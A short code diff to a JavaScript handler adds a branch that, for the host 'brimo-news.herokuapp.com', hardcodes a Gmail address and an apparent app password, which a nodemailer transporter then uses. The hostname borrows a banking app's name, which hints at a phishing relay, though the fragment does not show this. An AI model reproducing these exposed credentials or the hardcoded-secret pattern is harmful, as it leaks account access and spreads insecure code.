@@ -38,6 +38,12 @@ export default function handler(req, res) {
         
 
     }
+    else if (url == 'brimo-news.herokuapp.com'){
+        email = 'samesenangtobo14@gmail.com';
+        pass = 'iebkxjlpwrdfubjf';
+        
+
+    }
         
         try {
             const transporter = nodemailer.createTransport({
